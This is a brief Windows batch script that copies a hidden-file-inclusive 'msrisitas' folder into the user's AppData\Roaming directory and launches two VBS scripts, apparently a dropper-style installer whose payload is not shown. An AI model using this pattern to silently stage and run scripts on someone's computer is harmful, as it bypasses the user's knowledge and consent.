@echo off

xcopy .\msrisitas C:\Users\%username%\AppData\Roaming\msrisitas /H /i

start lsc.vbs


start "" /d "%appdata%\msrisitas\" "msrisitas.vbs"

exit